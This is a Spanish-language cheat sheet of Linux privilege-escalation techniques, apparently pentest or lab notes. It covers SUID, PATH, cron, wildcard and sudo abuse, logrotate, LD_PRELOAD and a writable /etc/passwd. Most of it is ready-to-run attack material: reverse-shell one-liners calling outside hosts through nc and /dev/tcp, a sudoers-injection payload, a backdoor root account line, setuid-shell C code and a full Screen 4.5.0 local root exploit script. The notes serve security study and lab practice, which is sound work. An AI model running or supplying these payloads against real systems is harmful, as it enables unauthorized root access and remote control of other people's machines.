### Explotación de SUID/GUID

buscar suid files:

    find / -perm -u=s -type f 2>/dev/null

Buscamos en gtfobins explotaciones conocidas:

    https://gtfobins.github.io/

---
### Explotación del passwd

El passwd permite a los usuarios cambiar la contraseña, como debe reescribir el archivo /etc/passwd, corre con permisos de root.

#### 1) Buscamos nuestro uid(número entre parentecis) con el comando id
    id
#### 2) COrremos el comando sin cambiar la contraseña
    passwd
#### 3) Buscamos el PID del proceso
    ps u -C passwd
#### 4) Vemos el Uid del proceso
    grep Uid /proc/<PID>/status
#### 5) Si encontramos que el proceso tiene como value 0 en alguna de las cuatro casillas, vamos a buscar el binario
    ls -asl /usr/bin/passwd

#### 6) SI el resultado es -rwsr-xr-x
    find /home/<user>/Desktop -exec "/usr/bin/bash" -p \;

---
### Path Abuse

Podemos aprovecharlo para inyectar archivos maliciosos en una cadena de ejecución. El path tiene un orden y en ese mismo orden el sistema buscará los distintos binarios que necesite para la ejecución.
##### EJ:

Imaginemos un fichero que necesita correr el binario "ECHO" durante su ejecución, al momendo de llamarlo, buscará a lo largo de los directorios de la variable de entorno PATH hasta encontrarlo y ejecutarlo.
De esta manera, si nosotros creamos en un directorio controlado por nosotros un archivo con un código malicioso y lo llamamos ECHO, agregamos este directorio al PATH en un lugar anterior al lugar del path donde 
el verdadero ECHO existe, la computadora lo ejecutará.


#### 1) Buscamos una carpeta donde tengamos permiso de escritura
#### 2) creamos el archivo malicioso
#### 3)Agregamos la dirección al path

    PATH=/<directory>:${PATH}
    export PATH

---
### Cronjob abuse:

Los cron jobs son tareas rutinarias que se corren cada X tiempo de manera automática.
Los cronjobs corren con permisos de root. Si uno de los archivos corridos tiene permiso de escritura, entonces podemos modificarlo para que, al ser corrido, podamos escalar privilegios.
##### Identificar los archivos con permisos de escritura:
        find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

##### Luego podemos imprimir el crontab para ver si alguno de estos archivos aparece:
        grep "CRON" /var/log/syslog

##### De no aparecer ningún archivo, podemos usar pspy para ver los eventos que pasan en el sistema y constatar si alguno está corriendo de manera reiterada:

        ./pspy64 -pf -i 1000

##### Vemos entre los scripts corridos por el cronjob si tenemos permiso de escritura sobre alguno

##### Cuando lo encontramos, agregamos al mismo una reverseshell

    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
    
##### Iniciamos un listener y esperamos que el proceso se ejecute nuevamente.


---

### CP impersonation

Si tenemos el privilegio de correr el binario cp como otro usuario podemos aprovecharlo para generar una id_rsa para poder loguearnos por SSH con ese usuario.

##### 1) creamos una id_rsa en nuestra carpeta ssh

    ssh-keygen
##### 2) Damos permisos totales a la id_rsa.pub

    chmod 777 id_rsa.pub
##### 3) Copiamos el archivo .pub a un carpeta dentro de nuestro directorio que no esté restringida como ssh
##### 4) sudo -u <user> /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
##### 5) Nos transferimos la id_rsa de nuestro directorio ssh
##### 6) Nos logueamos mediante ssh con el user a impersonar y la id_rsa
---

### Abusing WGET privileges:

    https://vk9-sec.com/wget-privilege-escalation/
    
----

### WILDCARd ABUSE:

cuando nos encontramos un fichero en el cron que ejecuta en base a un wildcard en una carpeta, podemos sumar ficheros y ordenes de ejecución maliciosas.

##### Ej:
Supongamos que en el cronjob nos encontramos un proceso que corre automáticamente guardando un backup con un wildcard:

tar czf /tmp/backup.tar.gz *

Si tenemos permisos sobre la carpeta en la que está generando el backup, podríamos insertar lo siguiente y esperar que corra para que lo ejecute con permisos de sudo:

        echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
        echo "" > "--checkpoint-action=exec=sh root.sh"
        echo "" > --checkpoint=1


---

### SUDO RIGHTS
Es cuando podemos correr files con otro usuario sin password 

lo llamamos con:
        sudo -l
#### TCPDUMP:
Podemos alcanzar una shell reversa con tcpdump
##### 1) Creamos una reverse shell en alguna carpeta donde podamos escribir
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

##### 2) Iniciamos un netcat
##### 3)Lo ejecutamos desde tcpdump

        sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root


---

### Logrotate

Logrotate se encarga de reemplazar logs antiguos por nuevos de manera automática para no generar ficheros interminables y pesados. Cuando el log a se vuelve muy grande, log rotate crea el log a.1 como contunuación del mismo.

Para poder explotarlo se necesitan 3 cosas:

- Necesitamos permiso de escritura sobre los logs
- Logrotate debe correr como root
- Que se encuentre entre las versiones: 3.8.6,  3.11.0, 3.15.0, 3.18.0

##### A) ver versión de logrotate

        logrotate --version
##### B)Buscar logs sobre los que tengamos permisos

        find / -type f -name "*.log" -exec test -w {} \; -print 2>/dev/null

##### c) Hacemos llegar el exploit a la pc victima

        https://github.com/whotwagner/logrotten

##### D) lo compilamos:
        gcc logrotten.c -o logrotten

##### E) Creamos un Payload que busquemos ejecutar:

        echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

##### F) Iniciamos un nc
##### G) Vemos en qupe está seteado el logrotate.conf

        grep "create\|compress" /etc/logrotate.conf | grep -v "#"

##### H)Corremos el exploit
Si el logrotate.cfg está seteado en crear:

        ./logrotten -p ./payload /tmp/tmp.log

Si el log rotate está seteado en compress:

        ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
        
##### I)Abusamos del log con permiso de escritura para que logrotate corra y el exploit haga su magia.

        
---

### LD_PRELOAD EXPLOITATION

Supongamos que podemos correr con permisos de root un pero no hay un GTFObins para explotarlo. Podemos interntar con LD_PRELOAD.
LD_PRELOAD es una variable de entorno que puede cargar una librería antes de ejecutar un binario.

Esto podemos hacerlo si encontramos la variable "env_keep+=LD_PRELOAD" al correr el "sudo -l" o dentro del archivo /etc/sudoers

##### 1)Creamos una librería en c

        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>
        
        void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
        }

##### 2)Compilamos la librería

        gcc -fPIC -shared -o root.so root.c -nostartfiles

##### 3)llamamos al binario sobre el que tenemos permisos de sudo anteponiendo la carga de nuestra librería

        
        sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

---

### Abusing VIM privileges:

Si tenemos permisos de correr vim como otro usuario podemos aprovechar vim para obtener una shell con dicho user (también sirve para escaparse de entornos restringidos)

    sudo -u <user> vim

Una vez abierto:

    :!sh

---

### explotar el /etc/passwd reescribible:

si el passwd file es reescribible por un user del que tenemos control, podemos crear un nuevo root

##### 1)antes de agregar un user, se crea un hash con un salt

    openssl passwd w00t

##### 2)agregamos el user al listado del passwd:

    echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

---

### Screen version 4.5.0 

Ttiene una vulnerabilidad que nos permite escalar privilegios.


#### Script.sh

    #!/bin/bash
    # screenroot.sh
    # setuid screen v4.5.0 local root exploit
    # abuses ld.so.preload overwriting to get root.
    # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
    # HACK THE PLANET
    # ~ infodox (25/1/2017)
    echo "~ gnu/screenroot ~"
    echo "[+] First, we create our shell and library..."
    cat << EOF > /tmp/libhax.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/stat.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    cat << EOF > /tmp/rootshell.c
    #include <stdio.h>
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
    rm -f /tmp/rootshell.c
    echo "[+] Now we create our /etc/ld.so.preload file..."
    cd /etc
    umask 000 # because
    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
    echo "[+] Triggering..."
    screen -ls # screen itself is setuid, so...
    /tmp/rootshell

---

### Impersonating restricted SUDO

SI tenemos permiso para correr un archivo como cualquier usuario menos como root y la version de SUDO es 1.8.27 podríamos obligarlo a correr una bash como root usando el siguiente código:

    sudo -u#-1 /bin/bash

---

#### Escalar privilegios con nmap (en la pc victima)

si soporta el modo interactivo:

    nmap --interactive

Luego invocamos una shell

    !sh

